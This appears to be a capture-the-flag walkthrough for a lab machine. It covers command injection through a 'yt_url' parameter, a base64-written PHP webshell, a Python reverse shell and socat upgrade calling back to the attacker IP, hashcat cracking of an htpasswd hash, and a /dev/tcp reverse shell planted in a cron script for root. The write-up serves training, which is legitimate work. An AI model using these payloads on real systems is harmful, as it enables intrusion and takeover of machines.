# Enumeration

Nmap:
```bash
nmap -v -Pn -p- -T4 -oN tcp_all.nmap 10.10.198.252

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## HTTP

![[Pasted image 20240507084936.png]]

Convert 'test':
![[Pasted image 20240507085649.png]]

/admin
![[Pasted image 20240507085603.png]]

# Initial foothold


Looks like the *yt_url* parameter is vulnerable to command injection:
![[Pasted image 20240507091208.png]]

Need to escape spaces with `$IFS`
## Lets pop a shell

Base64 encode:
`<?php system($_GET["cmd"]);  ?>`

and write in into `tmp/shell.php`:
```
yt_url=http%3a//127.0.0.1/`echo$IFS"PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ICA/Pg=="|base64$IFS-d>tmp/shell.php`
```

Now we can access our webshell at `http://10.10.198.252/tmp/shell.php?cmd=whoami`:
![[Pasted image 20240507094529.png]]

Interesting users:
```
root:x:0:0:root:/root:/bin/bash
[...]
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash
```

System info:
```bash
Linux dmv 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

## Upgrade webshell to reverse shell

Via python:
```bash
http://10.10.118.61/tmp/shell.php?cmd=python%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.0.131%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
```

## Upgrade reverse shell

Upload socat to `/tmp` in order to add execute permissions.

On attacker:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:7777
```

On target:
```bash
cd /tmp
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.9.0.131:7777
```


User flag (`/var/www/html/admin/flag.txt`):
`flag{0d8486a0c0c42503bb60ac77f4046ed7}`

---
## Additional content

There already was a webshell on the system :D
```bash
www-data@dmv:/var/www/html$ cat admin/index.php
```

```php
<?php
  if (isset($_REQUEST['c'])) {
      system($_REQUEST['c']);
      echo "Done :)";
  }
?>

<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button>
</a>
```
=> However this pages is basic authentication protected

User 
`cat admin/.htpasswd`
=> `itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/`

Crack:
```bash
hashcat -m 1600 hashes.txt /usr/share/wordlists/rockyou.txt
```
=> `$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie`

With `itsmeadmin:jessie` we can now access the build in webshell:
![[Pasted image 20240507105355.png]]
# PrivEsc

Pspy64 output:
![[Pasted image 20240507103905.png]]

Modify `clean.sh` to pop a root shell. Add the following line:
`bash -i >& /dev/tcp/10.9.0.131/8888 0>&1`

Enjoy the root shell:
![[Pasted image 20240507104227.png]]

Root flag: `flag{d9b368018e912b541a4eb68399c5e94a}`